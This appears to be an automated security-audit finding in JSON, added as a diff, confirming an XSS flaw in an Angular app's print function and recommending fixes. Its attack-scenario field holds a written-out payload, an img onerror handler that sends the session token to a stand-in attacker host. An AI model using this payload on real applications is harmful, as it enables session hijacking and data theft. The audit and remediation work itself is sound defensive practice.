@@ -1,0 +1,89 @@
+{
+  "$schema": "../../../../d4rthb0b/schemas/vulnerability-investigation.schema.json",
+  "schema_version": "1.0",
+  "phase": "inquisitor",
+  "vulnerability_id": "VULN-004",
+  "descriptor": "xss-document-write-print-copy",
+  "assessment_id": "2026-08-02-20-57",
+  "metadata": {
+    "investigated": "2026-08-02T22:00:00Z",
+    "analyst": "D4rthB0b-Inquisitor",
+    "status": "confirmed"
+  },
+  "investigation": {
+    "confirmed_at": "2026-08-02T22:00:00Z",
+    "exploitability": "high",
+    "root_cause": "formatPrintPage() in app.component.ts line 535 uses document.write('<div>' + element + '</div>') where element is derived from ApplinX REST API field.content via GXUtils.formatLineText() without HTML encoding. The print popup is opened with window.open('', '') which shares the same origin as the main application, allowing injected JavaScript to access sessionStorage (gx_token, userName, oidc_state). DomSanitizer is injected in AppComponent but never used. The copy modal path (Sink 2) is a false positive: formatCopyPage() uses paraElement.innerText = element (text assignment), which HTML-encodes on subsequent innerHTML read.",
+    "attack_scenario": "Compromised ApplinX backend sends a terminal field containing: <img src=x onerror=\"fetch('https://attacker.com/exfil?t='+sessionStorage.getItem('gx_token'))\">. Authenticated user clicks the Print button. formatPrintPage() calls document.write('<div><img src=x onerror=...></div>'). Browser executes the onerror handler in the same-origin popup, stealing gx_token and exfiltrating it. Attacker uses the token to make authenticated REST API calls, viewing or modifying mainframe terminal session data.",
+    "prerequisites": [
+      "ApplinX REST API backend compromised OR MITM on unencrypted REST API channel",
+      "Authenticated user must click the Print button (user interaction required)",
+      "No Content-Security-Policy blocking inline event handlers in popup"
+    ],
+    "privilege_boundary": {
+      "start_privilege": "Compromised ApplinX backend (server-side attacker)",
+      "achieved_privilege": "Authenticated browser session — access to gx_token, sessionStorage, same-origin API calls",
+      "boundary_crossed": true
+    },
+    "impact": {
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "low",
+      "description": "Session token (gx_token / Bearer auth) stolen. Attacker can impersonate the user for all ApplinX REST API calls: read terminal screens, send keystrokes, access/delete macros, obtain screen data containing mainframe PII. Integrity impact: attacker can modify session state, send keystrokes to mainframe applications."
+    },
+    "data_flow": {
+      "sources": [
+        "ApplinX REST API GetScreenResponse fields[].content (server-controlled terminal data)"
+      ],
+      "transformations": [
+        "generateObjectArray() copies field.content to obj['data'] — no encoding",
+        "formatLineText() / GXUtils.replaceString() — plain string operations, no HTML encoding",
+        "formatPrintPage() receives printDetails[] array of plain strings",
+        "window.open('', '') creates same-origin popup"
+      ],
+      "sinks": [
+        "popupWindow.document.write('<div>' + element + '</div>') — CONFIRMED XSS sink",
+        "document.getElementById('copyDiv').innerHTML = this.copyData — FALSE POSITIVE (content is HTML-encoded via innerText assignment path)"
+      ]
+    }
+  },
+  "affected_components": {
+    "direct": [
+      {
+        "component": "AppComponent.formatPrintPage()",
+        "impact": "XSS via document.write() with unsanitized terminal content — session hijacking"
+      }
+    ],
+    "indirect": [
+      {
+        "component": "sessionStorage (gx_token, userName, oidc_state)",
+        "impact": "Accessible from same-origin print popup — exfiltrable via XSS payload"
+      },
+      {
+        "component": "ApplinX REST API",
+        "impact": "All authenticated endpoints accessible with stolen gx_token"
+      }
+    ]
+  },
+  "remediation_guidance": {
+    "recommended_fix": "Replace string concatenation in document.write() with safe DOM creation: use popupWindow.document.createElement('div') and set div.textContent = element (never innerHTML). Alternatively use the already-injected DomSanitizer: sanitizer.sanitize(SecurityContext.HTML, element). Apply the same fix pattern to any other document.write() calls in formatPrintPage().",
+    "priority": "immediate",
+    "defense_in_depth": [
+      "Replace all document.write('<div>' + element + '</div>') with createElement + textContent",
+      "Remove or utilize the already-injected DomSanitizer for all HTML output paths",
+      "Add Content-Security-Policy header: script-src 'self' to block inline event handlers",
+      "Consider printing via a server-rendered endpoint instead of client-side popup",
+      "Audit all remaining document.write() and innerHTML assignments for server-supplied data"
+    ]
+  },
+  "references": {
+    "scan_finding": "VULN-004-S-scan-finding.md",
+    "threat_model": ["TM-003", "TM-006"],
+    "attack_surface": ["AS-004"],
+    "external": [
+      "OWASP XSS Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
+      "CWE-79: Improper Neutralization of Input During Web Page Generation",
+      "Attack chain AC-001: XSS → Token Theft via same-origin print popup"
+    ]
+  }
+}
